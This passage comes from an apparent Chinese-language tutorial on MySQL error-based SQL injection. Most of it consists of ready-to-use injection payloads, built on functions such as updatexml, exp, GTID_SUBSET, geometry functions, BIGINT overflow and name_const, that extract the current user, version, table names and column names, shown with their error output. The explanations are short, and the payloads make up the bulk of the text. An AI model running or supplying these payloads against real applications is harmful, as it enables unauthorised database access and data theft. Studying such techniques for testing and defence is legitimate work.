<p>**报错原理:**Xpath格式语法书写错误的话，就会报错，同<code>extractValue()</code></p>
<p><strong>利用语句：</strong></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">updatexml</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">concat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x23</span><span class="token punctuation" style="color:#393A34">,</span><span class="token keyword" style="color:#00009f">user</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x23</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27; and updatexml(1,mid(concat(0x23,(SELECT group_concat(table_name) from information_schema.tables where table_schema = database()),0x23),1,32),1) and &#x27;</span><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27;=&#x27;</span><span class="token number" style="color:#36acaa">1</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211219194200723" src="/assets/images/image-20211219194200723-4f438aa5654d72fef9a25e287b021a78.png" width="1886" height="374" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="exp">exp()<a href="#exp" class="hash-link" aria-label="exp()的直接链接" title="exp()的直接链接">​</a></h4>
<p><strong>函数语法：</strong><code>exp(int x)</code> -&gt; 返回 <code>e ** x</code></p>
<p>**适用范围：**适用于<code>mysql&lt;=5.5.52</code>时，<code>&gt;5.5.53</code>则不能返回查询结果</p>
<p>**报错原理：**e的x次方到x每增加1，其结果都将跨度极大，而mysql能记录的double数值范围有限，一旦结果超过范围，则该函数报错</p>
<p><img decoding="async" loading="lazy" alt="image-20211219162817414" src="/assets/images/image-20211219162817414-ddf08b9de7699d82fa7f90c999b788f0.png" width="1300" height="104" class="img_ev3q"></p>
<p>将0按位取反，<code>~0</code>，可以看到取值为<code>18446744073709551615</code>，这个值就比double范围最大值要大，所以再利用mysql 函数正常取值之后会返回0的特性，那么当函数执行成功，然后按位取反之后得到的值直接造成double型溢出</p>
<p><img decoding="async" loading="lazy" alt="image-20211219162731154" src="/assets/images/image-20211219162731154-6f2843ca2eb7c901a85887176c2da0bf.png" width="534" height="326" class="img_ev3q"></p>
<p><strong>利用语句：</strong></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> exp</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">~</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> version</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27; and exp(~(select * from (select version())x)) and &#x27;</span><span class="token number" style="color:#36acaa">1</span><span class="token string" style="color:#e3116c">&#x27;=&#x27;</span><span class="token number" style="color:#36acaa">1</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211219163535775" src="/assets/images/image-20211219163535775-bc2338f4f6f6a423160df67f7289b930.png" width="1986" height="346" class="img_ev3q"></p>
<p><code>exp()</code>函数套用两层的子查询的原因：</p>
<ol>
<li>先查询 <code>select version()</code> 这里面的语句，将这里面查询出来的数据作为一个结果集，取名为 x</li>
<li>再 <code>select from x</code> 查询x ,将结果集x 全部查询出来；这里必须使用嵌套，因为不使用嵌套不加<code>select from</code> 无法大整数溢出。</li>
</ol>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="gtid相关函数">GTID相关函数<a href="#gtid相关函数" class="hash-link" aria-label="GTID相关函数的直接链接" title="GTID相关函数的直接链接">​</a></h4>
<p>**报错原理：**参数格式不正确</p>
<p><strong>适用范围：</strong><code>&gt;=5.7</code></p>
<p><strong>利用语句：</strong></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> GTID_SUBSET</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">user</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> GTID_SUBTRACT</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">user</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211220130749401" src="/assets/images/image-20211220130749401-777c2b1a2f6f4925c9c8bc662d23ab47.png" width="1428" height="232" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="st相关函数">ST相关函数<a href="#st相关函数" class="hash-link" aria-label="ST相关函数的直接链接" title="ST相关函数的直接链接">​</a></h4>
<p>**报错原理：**参数格式不正确</p>
<p><strong>适用范围：</strong><code>&gt;=5.7</code></p>
<p><strong>利用语句：</strong></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> ST_LatFromGeoHash</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">version</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> ST_LongFromGeoHash</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">version</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> ST_PointFromGeoHash</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">version</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211220131036225" src="/assets/images/image-20211220131036225-2b024f544c9534688bef3f13f6a08175.png" width="1762" height="316" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="几何函数">几何函数<a href="#几何函数" class="hash-link" aria-label="几何函数的直接链接" title="几何函数的直接链接">​</a></h4>
<p>**报错原理：**函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错。</p>
<p><strong>利用语句：</strong></p>
<table><thead><tr><th>函数</th><th>用法</th></tr></thead><tbody><tr><td>GeometryCollection()</td><td><code>GeometryCollection((select * from (select* from(select user())a)b))</code></td></tr><tr><td>polygon()</td><td><code>polygon((select * from(select * from(select user())a)b))</code></td></tr><tr><td>multipoint()</td><td><code>multipoint((select * from(select * from(select user())a)b))</code></td></tr><tr><td>multilinestring()</td><td><code>multilinestring((select * from(select * from(select user())a)b))</code></td></tr><tr><td>linestring()</td><td><code>linestring((select * from(select * from(select user())a)b))</code></td></tr><tr><td>multipolygon()</td><td><code>multipolygon((select * from(select * from(select user())a)b))</code></td></tr></tbody></table>
<p>执行的结果均为</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ERROR </span><span class="token number" style="color:#36acaa">1367</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">22007</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">: Illegal non geometric </span><span class="token string" style="color:#e3116c">&#x27;(select `b`.`user()` from (select &#x27;</span><span class="token plain">root</span><span class="token variable" style="color:#36acaa">@localhost</span><span class="token string" style="color:#e3116c">&#x27; AS `user()` from dual) `b`)&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">value</span><span class="token plain"> found during parsing</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211220105654678" src="/assets/images/image-20211220105654678-b07d096a72a084777188137159f39af1.png" width="3062" height="954" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="bigint">BIGINT<a href="#bigint" class="hash-link" aria-label="BIGINT的直接链接" title="BIGINT的直接链接">​</a></h4>
<p><strong>报错原理：</strong></p>
<p>当mysql数据库的某些边界数值进行数值运算时，会产生报错。</p>
<p>如<code>~0</code>得到的结果：18446744073709551615</p>
<p>若此数参与运算，则很容易会错误</p>
<p><strong>利用语句：</strong></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">!</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">user</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">a</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">-</span><span class="token operator" style="color:#393A34">~</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211220111215894" src="/assets/images/image-20211220111215894-900681f93d0f65bcc1de25710a2dda90.png" width="2304" height="88" class="img_ev3q"></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 当前用户</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">&#x27; </span><span class="token operator" style="color:#393A34">AND</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">!</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">user</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">a</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">-</span><span class="token operator" style="color:#393A34">~</span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- -</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211220111250081" src="/assets/images/image-20211220111250081-c0289dedd297a23b1b3205b4e0a13e8a.png" width="2056" height="370" class="img_ev3q"></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 当前数据库的所有表名</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">&#x27; </span><span class="token operator" style="color:#393A34">AND</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">!</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> group_concat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">table_name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">tables</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> table_schema</span><span class="token operator" style="color:#393A34">=</span><span class="token keyword" style="color:#00009f">database</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">a</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">-</span><span class="token operator" style="color:#393A34">~</span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- -</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211220111359546" src="/assets/images/image-20211220111359546-3f09163b702a97074b8dab1fd96bde2b.png" width="2146" height="358" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="uuid相关函数">uuid相关函数<a href="#uuid相关函数" class="hash-link" aria-label="uuid相关函数的直接链接" title="uuid相关函数的直接链接">​</a></h4>
<p><strong>适用范围：</strong><code>&gt;=8.0</code></p>
<p>**报错原理：**参数格式不正确会导致报错。</p>
<p><strong>利用语句：</strong></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> uuid_to_bin</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">database</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> bin_to_uuid</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">database</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211220112723018" src="/assets/images/image-20211220112723018-0a32026f557643a7333eb439ac85fd7e.png" width="1572" height="176" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="不存在的函数">不存在的函数<a href="#不存在的函数" class="hash-link" aria-label="不存在的函数的直接链接" title="不存在的函数的直接链接">​</a></h4>
<p>**报错原理：**随便使用不存在的函数，可能会得到当前所在数据库的名称</p>
<p><strong>利用语句：</strong></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> a</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211220105829879" src="/assets/images/image-20211220105829879-bce0468759b94306c5c5c9831cf36509.png" width="1740" height="350" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="name_const">name_const()<a href="#name_const" class="hash-link" aria-label="name_const()的直接链接" title="name_const()的直接链接">​</a></h4>
<p>**报错原理：**mysql列名重复会导致报错,通过<code>name_const</code>制造一个列，配合笛卡尔积查询得到列名</p>
<p>**局限：**仅可取数据库版本信息</p>
<p><strong>利用语句：</strong></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> name_const</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">version</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">name_const</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">version</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">a</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211220111756976" src="/assets/images/image-20211220111756976-09c0e3e4e70cb433d72c40f828123a48.png" width="1664" height="94" class="img_ev3q"></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token number" style="color:#36acaa">1</span><span class="token plain">&#x27; </span><span class="token operator" style="color:#393A34">AND</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> name_const</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">version</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">name_const</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">version</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">a</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- -</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211220111859499" src="/assets/images/image-20211220111859499-23e68f841c37740a47ac0cb58891c513.png" width="1810" height="354" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="join-using">join using<a href="#join-using" class="hash-link" aria-label="join using的直接链接" title="join using的直接链接">​</a></h4>
<p>**报错原理：**系统关键词<code>join</code>可建立两个表之间的内连接。</p>
<p>通过对想要查询列名的表与其自身建立内连接，会由于冗余的原因(相同列名存在)，而发生错误，并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件来避免报错。</p>
<p>**局限：**在知道数据库跟表名的情况下使用才可以爆字段</p>
<p><strong>利用语句：</strong></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> 表名 a </span><span class="token keyword" style="color:#00009f">join</span><span class="token plain"> 表名 b</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> c</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users a </span><span class="token keyword" style="color:#00009f">join</span><span class="token plain"> users b</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> c</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users a </span><span class="token keyword" style="color:#00009f">join</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">b</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">c</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> 表名 a </span><span class="token keyword" style="color:#00009f">join</span><span class="token plain"> 表名 b </span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">已知的字段</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">已知的字段</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> c</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users a </span><span class="token keyword" style="color:#00009f">join</span><span class="token plain"> users b </span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">id</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> c</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users a </span><span class="token keyword" style="color:#00009f">join</span><span class="token plain"> users b </span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">id</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">username</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> c</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211220130236913" src="/assets/images/image-20211220130236913-0292340f3d36d1e485e51c6522c8df40.png" width="1638" height="268" class="img_ev3q"></p>
